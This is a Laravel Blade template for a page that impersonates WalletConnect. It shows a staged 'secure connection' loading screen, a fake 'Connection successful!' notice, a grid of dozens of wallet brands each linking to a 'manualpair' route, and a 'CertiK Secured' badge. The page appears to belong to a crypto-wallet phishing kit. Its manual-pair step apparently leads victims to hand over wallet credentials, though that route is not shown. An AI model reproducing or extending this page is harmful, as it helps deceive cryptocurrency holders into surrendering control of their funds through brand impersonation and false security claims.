@extends('theme.home')


@section('content')
    {{-- Loading Overlay --}}
    <div id="loading-overlay"
        style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #080b18; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center;">
        <img src="{{ asset('landing/assets/img/walletconnect.svg') }}" alt="WalletConnect"
            style="width: 80px; height: auto; margin-bottom: 20px;">
        <p style="color: #fff; font-size: 16px; font-weight: 300; margin-bottom: 20px; text-align: center;">Initiating secure
            connection to W2.0 protocol</p>
        <div class="spinner"
            style="width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite;">
        </div>
    </div>
    <style>
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(function() {
                document.getElementById('loading-overlay').style.display = 'none';
            }, 10000);
        });
    </script>

    <div class="body_wrap">
        <div class="container py-5">
            <div class="row justify-content-center">
                <div class="col-12 col-md-8 col-lg-6">

                    {{-- WalletConnect Header --}}
                    <div class="d-flex align-items-center justify-content-center mb-4">
                        <img src="{{ asset('landing/assets/img/walletconnect.svg') }}" alt="WalletConnect"
                            style="width: 40px; height: auto; margin-right: 4px;">
                        <h4 class="text-white mb-0" style="font-family: var(--font-heading);">
                            WalletConnect
                        </h4>
                    </div>

                    {{-- Success Message Box --}}
                    <div class="mb-4 p-3"
                        style="background-color: #e8f5e9; border-left: 4px solid var(--color-primary); border-radius: 8px;">
                        <p class="mb-0" style="color: #1b5e20;">
                            <strong>Connection successful!</strong> Proceed to select your wallet.
                        </p>
                    </div>

                    {{-- Wallet Grid --}}
                    <div class="row g-3">

                        @php
                            $wallets = [
                                ['image' => 'tw.png', 'name' => 'TrustWallet'],
                                ['image' => 'mm.png', 'name' => 'MetaMask'],
                                ['image' => 'phantom.jpeg', 'name' => 'Phantom'],
                                ['image' => 'safepal.png', 'name' => 'SafePal'],
                                ['image' => 'trz.png', 'name' => 'Trezor'],
                                ['image' => 'exd.svg', 'name' => 'Exodus'],
                                ['image' => 'cnb.svg', 'name' => 'Coinbase'],
                                ['image' => 'cry.png', 'name' => 'Crypto.com'],
                                ['image' => 'ledgerlive.png', 'name' => 'Ledger Live'],
                                ['image' => 'okx.png', 'name' => 'OKX Wallet'],
                                ['image' => 'coin98.png', 'name' => 'Coin98'],
                                ['image' => 'tokenpocket.png', 'name' => 'TokenPocket'],
                                ['image' => 'math-wallet.png', 'name' => 'Math Wallet'],
                                ['image' => 'bitkeep.png', 'name' => 'BitKeep'],
                                ['image' => 'bitpay.jpg', 'name' => 'BitPay'],
                                ['image' => 'alpha-wallet.jpg', 'name' => 'AlphaWallet'],
                                ['image' => 'aktionariat.png', 'name' => 'Aktionariat'],
                                ['image' => 'alice.png', 'name' => 'Alice'],
                                ['image' => 'atwallet.png', 'name' => 'AT Wallet'],
                                ['image' => 'authereum.png', 'name' => 'Authereum'],
                                ['image' => 'backpack wallet.webp', 'name' => 'Backpack'],
                                ['image' => 'bridge-wallet.png', 'name' => 'Bridge Wallet'],
                                ['image' => 'bsc-logo.png', 'name' => 'BSC Wallet'],
                                ['image' => 'coolwallet-s.png', 'name' => 'CoolWallet S'],
                                ['image' => 'cosmosstation.png', 'name' => 'Cosmostation'],
                                ['image' => 'cybavowallet.png', 'name' => 'Cybavo Wallet'],
                                ['image' => 'dcentwallet.png', 'name' => "D'CENT Wallet"],
                                ['image' => 'dok.png', 'name' => 'Dokwallet'],
                                ['image' => 'easypocket.jpg', 'name' => 'EasyPocket'],
                                ['image' => 'ellipal.png', 'name' => 'Ellipal'],
                                ['image' => 'equal.jpg', 'name' => 'Equal Wallet'],
                                ['image' => 'fetch.jpg', 'name' => 'Fetch.ai'],
                                ['image' => 'graph.jpg', 'name' => 'The Graph'],
                                ['image' => 'gridplus.png', 'name' => 'GridPlus'],
                                ['image' => 'harmony.png', 'name' => 'Harmony'],
                                ['image' => 'iconex.png', 'name' => 'ICONex'],
                                ['image' => 'infinito-wallet.png', 'name' => 'Infinito Wallet'],
                                ['image' => 'infinity-wallet.png', 'name' => 'Infinity Wallet'],
                                ['image' => 'kardachain.png', 'name' => 'KardiaChain'],
                                ['image' => 'keplr.png', 'name' => 'Keplr'],
                                ['image' => 'keyringpro.png', 'name' => 'Keyring Pro'],
                                ['image' => 'ln.png', 'name' => 'Ledger'],
                                ['image' => 'loopring-wallet.jpg', 'name' => 'Loopring Wallet'],
                                ['image' => 'maiar.png', 'name' => 'Maiar'],
                                ['image' => 'meetone.jpg', 'name' => 'MEET.ONE'],
                                ['image' => 'midas-wallet.png', 'name' => 'Midas Wallet'],
                                ['image' => 'morixwallet.png', 'name' => 'Morix Wallet'],
                                ['image' => 'mykey.png', 'name' => 'MYKEY'],
                                ['image' => 'nash.jpg', 'name' => 'Nash'],
                                ['image' => 'onto.png', 'name' => 'ONTO'],
                                ['image' => 'ownbit.png', 'name' => 'Ownbit'],
                                ['image' => 'peakdefi.png', 'name' => 'PeakDeFi'],
                                ['image' => 'rabby wallet.png', 'name' => 'Rabby Wallet'],
                                ['image' => 'sfp.png', 'name' => 'SafePal (SFP)'],
                                ['image' => 'sparkpoint.png', 'name' => 'SparkPoint'],
                                ['image' => 'spatium.jpg', 'name' => 'Spatium'],
                                ['image' => 'swft-wallet.png', 'name' => 'SWFT Wallet'],
                                ['image' => 'tokenary.png', 'name' => 'Tokenary'],
                                ['image' => 'torus.jpg', 'name' => 'Torus'],
                                ['image' => 'trustvault.png', 'name' => 'TrustVault'],
                                ['image' => 'unstoppable.png', 'name' => 'Unstoppable'],
                                ['image' => 'viawallet.png', 'name' => 'ViaWallet'],
                                ['image' => 'vision.png', 'name' => 'Vision'],
                                ['image' => 'wallet.io.png', 'name' => 'Wallet.io'],
                                ['image' => 'walleth.png', 'name' => 'WallETH'],
                                ['image' => 'wazirx-logo.png', 'name' => 'WazirX'],
                                ['image' => 'xdc.png', 'name' => 'XDC Wallet'],
                                ['image' => 'zelcore.png', 'name' => 'Zelcore'],
                            ];
                        @endphp

                        @foreach ($wallets as $wallet)
                            <div class="col-6">
                                <a href="{{ url('/connect/manualpair?wallet=' . urlencode($wallet['name'])) }}"
                                    class="d-block text-center p-4"
                                    style="background: #fff; border-radius: 12px; text-decoration: none;">
                                    <img src="{{ asset('landing/assets/img/walletlist/' . $wallet['image']) }}"
                                        alt="{{ $wallet['name'] }}"
                                        style="width: 60px; height: 60px; margin: 0 auto; border-radius: 12px; object-fit: contain; display: block;">
                                    <span class="d-block mt-2"
                                        style="color: #333; font-weight: 500;">{{ $wallet['name'] }}</span>
                                </a>
                            </div>
                        @endforeach

                        <div class="text-center mt-5">
                            <img src="{{ asset('landing/assets/img/certik-secured.svg') }}" alt="CertiK Secured"
                                style="max-width: 150px;">
                        </div>

                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection
